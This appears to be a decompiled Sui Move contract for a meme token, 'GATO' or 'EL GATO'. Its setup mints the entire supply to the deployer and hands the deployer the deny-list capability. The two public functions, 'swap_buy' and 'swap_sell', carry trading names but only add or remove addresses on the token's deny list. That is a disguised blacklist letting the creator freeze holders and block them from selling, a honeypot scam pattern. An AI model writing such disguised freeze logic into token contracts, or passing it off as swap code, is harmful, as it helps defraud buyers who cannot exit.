module 0x9875831fb4d273819fdc2f77bfc49891172a54e54c50fa498a2136f373ac93e7::gato {
    struct GATO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GATO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GATO>(arg0, 9, b"GATO", b"EL GATO", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmThCg2JHYJUW9PT9muqCp8drb4u9bEF8ZyCxzR3K5rTSm"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GATO>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GATO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GATO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GATO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GATO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GATO>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GATO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GATO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

